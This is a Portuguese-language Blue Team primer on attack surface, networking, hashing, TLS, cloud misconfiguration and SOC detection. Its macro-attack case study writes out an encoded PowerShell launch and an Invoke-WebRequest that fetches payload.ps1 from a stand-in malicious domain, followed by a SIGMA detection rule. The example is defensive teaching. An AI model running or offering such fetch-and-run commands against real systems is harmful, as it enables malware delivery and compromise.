Infra & Superfície de Ataque

Cada camada do sistema moderno é um ponto de entrada potencial. Blue Team começa na arquitetura, não no SOC.

Camada Tecnologia Vetor de ataque Severidade
Frontend React / Vue / Angular XSS, CSRF, clickjacking, injeção de script via inputs não sanitizados Alta
API REST / GraphQL Auth bypass, IDOR, SQLi, mass assignment, rate limit ausente Crítica
Banco Postgres / MySQL / Mongo SQL Injection, credencial vazada, dump completo, permissões excessivas Crítica
Rede Load balancer / DNS DDoS, man-in-the-middle, port scan, DNS hijacking, BGP spoofing Alta
Cloud AWS / GCP / Azure Credencial vazada, bucket público, porta aberta, IAM excessivo Crítica
CI/CD GitHub Actions / Jenkins Supply chain attack, segredo em env var, dependência comprometida Alta
"Blue Team não começa no SOC. Começa na arquitetura." — a superfície de ataque é definida nas decisões de design, não depois do deploy.

02

Redes — só o necessário

IP, porta, TCP handshake e DNS — o mínimo para detectar tráfego suspeito e reconhecer padrões de ataque na prática.

IP + PORTA

conceito # IP = endereço de quem 192.168.1.1 → máquina na rede # Porta = qual serviço :443 → HTTPS :22 → SSH :3306 → MySQL :6379 → Redis :27017→ MongoDB

DNS

resolução google.com ↓ consulta DNS 142.250.79.46 # atacante usa: evil-d0main.ru → C2 g00gle.com → phishing update-win.net → malware

TCP THREE-WAY HANDSHAKE

Cliente
Servidor
SYN
SYN-ACK
ACK ✓ conexão estabelecida

ALERTA

Muitos SYN sem ACK = port scan ou SYN flood (DDoS)

BEACONING

Conexão de saída a cada 60s exatos = malware se comunicando com C2

Tráfego estranho = sinal de ataque. Padrão repetitivo = malware. Isso é o que o SIEM detecta automaticamente correlacionando logs de rede.
03

Criptografia — sem viagem matemática

Hash, senhas com salt+custo e TLS. Três conceitos que todo dev precisa entender de verdade — não só saber o nome.

1. HASH — FUNÇÃO IRREVERSÍVEL

—

↑ SHA-256 em tempo real — mesma entrada sempre gera o mesmo hash · irreversível

uso # integridade de arquivo sha256sum firmware.bin → a3f9... ← verifica se foi alterado # token de sessão sessionToken = sha256(userId + timestamp + secret) # MD5 e SHA-1 → QUEBRADOS (não usar para segurança)

2. SENHA SEGURA — SALT + CUSTO

ERRADO # armazenar só o hash db.save(sha256(senha)) # problema: rainbow table → ataque offline mesmo hash para senhas iguais
CORRETO # bcrypt / argon2 db.save(bcrypt(senha, saltRounds=12)) # bcrypt: + salt aleatório por senha + custo configurável (lento = bom) + resistente a GPU/brute-force
"MD5 quebrado" não é sobre o algoritmo ser mágico — é sobre o custo de ataque. Hoje uma GPU testa bilhões de MD5/segundo. Bcrypt/Argon2 são lentos por design.

3. TLS (HTTPS) — O QUE PROTEGE E O QUE NÃO PROTEGE

Protegido pelo TLS

Conteúdo 🔒

Payload da requisição, body, headers, cookies — criptografados de ponta a ponta.

Visível mesmo com TLS

Domínio (SNI) ⚠

Durante o handshake, o hostname vai em claro — dá pra ver que você acessou evil.com.

Visível mesmo com TLS

Padrão de tráfego ⚠

Volume, frequência e tamanho dos pacotes — suficiente pra identificar beaconing de malware.

"Criptografia protege o conteúdo, não o comportamento." — isso é o que torna a análise de tráfego (NetFlow, Zeek) essencial no SOC mesmo com HTTPS.

CloudTrail + VPC Flow Logs → alimentam o SIEM

"99% dos problemas de segurança em cloud são de configuração." — porta 22 aberta pro mundo (0.0.0.0/0) é suficiente pra comprometer todo o ambiente.

ERROS CLÁSSICOS — CLOUD

Erro #1

Porta 22 aberta

Security Group com 0.0.0.0/0 na porta 22. Bots escaneiam a internet em minutos.

Erro #2

Bucket S3 público

Configuração padrão errada expõe dados sensíveis indexados pelo Google em horas.

Erro #3

IAM excessivo

Role com AdministratorAccess para uma Lambda que só lê um S3 — princípio do mínimo privilégio.

05

SOC — o coração do Blue Team

Um sistema que observa tudo e reage. Conecta infra, rede e cripto em resposta orquestrada. É aqui que tudo se une.

STACK DO SOC

FerramentaFunção
SIEM Centraliza e correlaciona logs de toda a infra. Detecta padrões que sistemas isolados não veriam.
EDR Monitora comportamento nos endpoints — processos, chamadas de sistema, rede por processo.
SOAR Automatiza a resposta: isola host, bloqueia IP, abre ticket — sem intervenção manual.
Threat Intel Feeds de IOCs: IPs maliciosos, hashes de malware, domínios C2 conhecidos.
UEBA Detecta comportamento anômalo de usuários — login 3am, download de 50GB, acesso incomum.

FLUXO DO ALERTA

1
Logs chegam ao SIEM
CloudTrail, Syslog, EDR, DNS, proxy, firewall — tudo centralizado
2
Correlação e regras
SIEM cruza eventos de múltiplas fontes — detecta o que nenhum sistema veria sozinho
3
Alerta gerado
Severidade classificada — crítico, alto, médio. SOAR recebe o trigger
4
Análise do analista
Falso positivo ou real? Qual o escopo? Outros hosts afetados?
5
Contenção & remediação
Isola host, revoga credencial, bloqueia domínio, corrige vuln. Lição aprendida.

CASO REAL — ATAQUE VIA MACRO OFFICE

sequência detectada # 1. usuário abre Excel com anexo de phishing EXCEL.EXE iniciado ← normal # 2. Excel chama PowerShell (ANOMALIA) EXCEL.EXE → powershell.exe -enc SGVsbG8gV29ybGQ= # 3. PowerShell baixa script externo Invoke-WebRequest https://bad-domain.ru/payload.ps1 # 4. malware conecta C2 a cada 60s (beaconing) conexão de saída → 185.220.xxx.xxx:443 ← C2 ───────────────────────────────────────────── # Regra SIGMA que detecta isso: ParentImage: '*\WINWORD.EXE' CommandLine|contains: '-enc' # IOA (Indicator of Attack) — comportamento

PYRAMID OF PAIN

Difícil
TTPs — Táticas, Técnicas e Procedimentos
Como o atacante age. Mudar exige reescrever o ataque inteiro. Detecte isso.
Difícil
Ferramentas usadas
Mimikatz, Cobalt Strike, BloodHound — podem trocar, mas custa tempo e dinheiro.
Médio
Artefatos de rede & host
Strings específicas no malware, chaves de registro, mutexes — podem ser ofuscados.
Fácil
Domínio C2
Troca em minutos com um novo domínio. Bloquear domínio é whack-a-mole.
Fácil
Hash de arquivo · IP
Muda em segundos. Bloquear só isso não protege nada de verdade.
Detecte comportamento, não coisa fixa. Um IP muda em 5 minutos. Um TTP muda em semanas. A Pyramid of Pain é o guia do que vale monitorar.
